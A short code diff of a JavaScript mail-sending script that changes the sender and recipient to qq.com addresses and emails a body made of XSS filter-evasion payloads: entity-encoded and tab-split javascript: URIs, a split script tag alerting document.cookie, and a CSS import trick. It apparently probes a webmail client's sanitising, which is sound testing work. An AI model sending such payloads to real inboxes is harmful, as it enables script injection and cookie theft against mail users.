@@ -4,7 +4,7 @@ function fnMySendMail(s,t,b)
 {
 	sendmail({
 	    // from: 'love2000@sougou.com',
-	    from: 'xiaozhang@sougou.com',
+	    from: '119980@qq.com',
 	    // from: s,
 	    to: s,
 	    subject: t,
@@ -23,4 +23,4 @@ function fnMySendMail(s,t,b)
 	});
 }
 
-fnMySendMail("xxx@re.com",'标xx题','内容...<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;><IMG SRC="jav&#x09;ascript:alert(\'XSS\');"><IMG SRC="jav	ascript:alert(\'XSS\');"><INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');"><scr'+'ipt>alert("OK" + document.cookie)</sc'+'ript><STYLE>@im\port\'\ja\vasc\ript:alert("XSS")\';</STYLE>.愿你安好');
+fnMySendMail("3135773@qq.com",'标xx题','内容...<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;><IMG SRC="jav&#x09;ascript:alert(\'XSS\');"><IMG SRC="jav	ascript:alert(\'XSS\');"><INPUT TYPE="IMAGE" SRC="javascript:alert(\'XSS\');"><scr'+'ipt>alert("OK" + document.cookie)</sc'+'ript><STYLE>@im\port\'\ja\vasc\ript:alert("XSS")\';</STYLE>.愿你安好');
